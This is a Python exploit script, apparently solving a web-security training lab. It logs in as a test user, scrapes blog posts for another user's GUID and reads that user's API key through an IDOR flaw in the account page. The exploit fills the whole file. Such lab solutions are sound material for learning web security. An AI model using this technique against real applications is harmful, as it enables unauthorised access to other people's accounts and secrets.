import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}   

def get_csrf_token(s, url):
    
    r = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    return csrf

def carlos_guid(s, url):

    # Load home page
    r = requests.get(url, proxies=proxies, verify=False)
    res = r.text
    post_ids = re.findall(r'postId=(\w+)"', res)
    unique_post_ids = list(set(post_ids))

    #loop through the unique post IDs and check if they belong to carlos
    for i in unique_post_ids:
        r = s.get(url + "/post?postId=" + i, proxies=proxies, verify=False)
        res = r.text
        if "carlos" in res:
            print("(+) Found Carlos post with postId: " + i)
            guid = re.findall(r"userId=(.*)'", res)[0]
            return guid

def carlos_api_key(s, url):

    # get CSRF token from login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    # login as wiener
    print("(+) Logging in as 'wiener'...")
    data = {"username": "wiener", "password": "peter", "csrf": csrf_token}
    r = s.post(login_url, data=data, proxies=proxies, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) User 'wiener' logged in successfully.")

        #Obtain Carlos GUI
        guid = carlos_guid(s, url)

        # Obtain Carlos API key using the GUID
        carlos_account_url = url + "/my-account?id=" + guid
        r = s.get(carlos_account_url, proxies=proxies, verify=False)
        res = r.text
        if "carlos" in res:
            print("(+) Accessed 'carlos' account successfully.")
            print("(+) Extracting API key from 'carlos' account page...")
            # Extract API key from carlos account page
            api_key = re.findall(r'Your API Key is:(.*)\<\/div>', res)
            print("(+) Carlos API Key: " + api_key[0])
        else:
            print("(-) Failed to access 'carlos' account. Status code: %d" % r.status_code)
            print("(-) Exiting the script.")
            sys.exit(-1)
        
    else:
        print("(-) Failed to log in as 'wiener'. Status code: %d" % r.status_code)
        print("(-) Exiting the script.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    carlos_api_key(s, url)

if __name__ == "__main__":
    main()